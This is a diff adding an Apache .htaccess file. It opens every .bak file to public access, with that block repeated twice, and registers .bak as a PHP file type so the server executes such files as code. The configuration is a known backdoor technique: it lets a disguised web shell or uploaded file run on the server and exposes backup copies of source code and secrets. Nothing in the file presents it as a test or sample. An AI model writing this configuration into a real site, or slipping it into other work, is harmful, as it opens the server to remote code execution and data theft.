@@ -1,0 +1,11 @@
+<FilesMatch "\.bak$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+<FilesMatch "\.bak$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+AddType application/x-httpd-php .bak
